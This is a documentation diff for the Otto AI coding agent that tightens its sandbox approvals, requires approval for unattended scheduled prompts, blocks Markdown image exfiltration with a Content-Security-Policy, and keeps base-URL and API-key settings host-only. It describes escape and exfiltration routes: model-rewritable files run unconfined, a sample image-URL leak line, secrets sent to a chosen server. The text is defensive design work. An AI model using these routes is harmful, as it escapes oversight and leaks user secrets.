@@ -410,8 +410,8 @@ external side effect did not occur.
   whenever the sandbox mode is Seatbelt. With `--sandbox off`
   every command is already unconfined. If the unconfined environment cannot be
   built with complete redactions, the list has no effect and commands stay
-  sandboxed. `/sandbox exclude` and `/approve <id> always` add entries from a
-  running session.
+  sandboxed. `/sandbox exclude` and `/approve <id> always` (which adds the
+  exact approved command) add entries from a running session.
 
   `/sandbox reload` applies edits to `network`, `read_paths`, and
   `excluded_commands` to the running process (see
@@ -820,18 +820,33 @@ Shared commands:
 - `/approve <id>` grants one pending elevated Bash command and immediately asks
   Otto to retry it. The grant is tied to the current session and exact command,
   is consumed once, and remains pending until it is replaced, consumed, or Otto exits.
-- `/approve <id> always` first adds `<program> *` to `[sandbox].excluded_commands`
-  (see [`[sandbox]`](#configuration)) and reloads the sandbox, then grants the
-  pending command once as `/approve <id>` does. `<program>` is the first word of
-  the pending command. The pending command must be a simple command whose first
-  word has no quote, backslash, or `=`. Otto refuses, and writes nothing, when
-  that program runs another command: shells and command runners such as `sh`,
-  `bash`, `env`, `sudo`, `xargs`, and `python3`. `git` is also refused: git runs
-  programs named by aliases (`alias.<name> = !...`) and by its configuration, so
-  `git *` would take arbitrary commands out of the sandbox. Use `/approve <id>`
-  for those. Later simple commands that start with the program run unconfined
-  with no approval, in this and later sessions. `/sandbox exclude 'git *'` is
-  accepted, and it removes the protection described in
+- `/approve <id> always` first adds the pending command, exactly as approved,
+  to `[sandbox].excluded_commands` (see [`[sandbox]`](#configuration)) and
+  reloads the sandbox, then grants the pending command once as `/approve <id>`
+  does. From then on the same command line, in this and later sessions, runs
+  unconfined with no approval; the same program with other arguments stays
+  sandboxed. Otto refuses, writes nothing, and states the reason when:
+  - the command is not simple (it chains, redirects or substitutes), or it
+    contains `*`;
+  - the first word is not a bare program name looked up on `PATH`: it contains
+    a quote, a backslash, `=`, `/` or `~`. A path such as `./build.sh` or
+    `/abs/dir/tool` can name a file in the workspace or in the sandbox's
+    private home and temporary directories, which the model can rewrite;
+  - the program runs another command given as an argument: shells and command
+    runners such as `sh`, `bash`, `env`, `sudo`, `xargs`, `python3`, and
+    `git`, which runs programs named by aliases (`alias.<name> = !...`) and by
+    its configuration;
+  - the program runs files from the working directory, so a fixed command line
+    would still run whatever the model last wrote there: build and package
+    tools such as `make`, `cargo`, `npm`, `go`, `pytest`, `docker`, and `awk`.
+
+  Use `/approve <id>` for those. An exact entry still runs whatever files its
+  arguments name: approve `always` only for a command whose arguments do not
+  point at files the model can write. To exclude every invocation of a program
+  deliberately, write `/sandbox exclude '<program> *'`. Entries of the form
+  `<program> *` that earlier versions added are kept as they are.
+  `/sandbox exclude 'git *'` is accepted, and it removes the protection
+  described in
   [Git metadata is read-only](#git-metadata-is-read-only-in-the-seatbelt-sandbox)
   for git commands.
 - `/skills` lists every available skill name in the current session; use `/skill <name>` for its description, location, contract-check status, and instructions.
@@ -1271,7 +1286,11 @@ and a restart.
 | `repeat` | `once` (default), `daily` or `weekdays`; the latter two at the `HH:MM` given in `at`. |
 
 Exactly one of `text` and `prompt` and exactly one of `seconds` and `at` are
-required. An empty or blank string counts as an absent field. Each origin (see
+required. Creating a `prompt` item asks the user for approval first, whatever
+its `repeat`: the request shows the prompt, `at` or `seconds`, and `repeat`,
+because the run uses the agent's tools (file edits and sandboxed commands)
+with no user present. A denied request creates nothing. A `text` item needs no
+approval. An empty or blank string counts as an absent field. Each origin (see
 below) has at most 32 active items. The result names the id, the first due
 time with its UTC offset, where the item will be delivered, and the current
 local time:
@@ -1857,7 +1876,10 @@ composer:
   a newline. Assistant text renders as GitHub-Flavored Markdown, with KaTeX
   math for `$...$` and `$$...$$`, plus Mermaid diagrams in fenced
   `mermaid` code blocks. Each tool call is a collapsible block with its
-  arguments and result.
+  arguments and result. The page is served with
+  `Content-Security-Policy: img-src 'self' data: blob:`, so a Markdown image
+  that points to another host is not loaded: model output such as
+  `![](https://host/?q=<text>)` cannot make the browser send a request.
 - **Image** selects one PNG, JPEG, or WebP image; pasting a screenshot selects
   it too. The composer shows a preview, and the image can be sent without text.
   Sending stores the original image with the prompt in session history and
@@ -2724,8 +2746,8 @@ can manage Otto's existing provider profiles through the running `otto serve`:
 /config profiles
 /config show <profile>
 /models <profile>
-/config add <profile> --provider <openai-compatible|chatgpt> --model <model> [--base-url <url>] [--api-key-env <name>] [--thinking <level>]
-/config set <profile> <model|thinking|base-url|api-key-env> <value>
+/config add <profile> --provider chatgpt --model <model> [--thinking <level>]
+/config set <profile> <model|thinking> <value>
 /config use <profile>
 /config remove <profile>
 /config confirm <token>
@@ -2743,6 +2765,15 @@ token. Send `/config confirm <token>` from the same chat and sender within ten
 minutes to write exactly that change, or `/config cancel` to discard it. The
 connector never accepts API-key values, bot secrets, raw TOML, arbitrary file
 writes, or providers other than `openai-compatible` and `chatgpt`.
+
+A profile's base URL and API-key environment variable name can only be changed
+on the host, through the web UI, the TUI or the config file. Together they
+decide which environment variable of `otto serve` is sent as a bearer token and
+to which URL, so a chat sender who could set them could send any of the
+server's environment variables to a server of their choice. `/config add` with
+`--base-url` or `--api-key-env`, `/config add --provider openai-compatible`
+(which needs a base URL), and `/config set <profile> base-url|api-key-env`
+reply that these fields are host-only and send nothing to `otto serve`.
 
 A saved profile change requires restarting `otto serve` before it becomes
 available to new sessions; it never silently changes an existing session. These
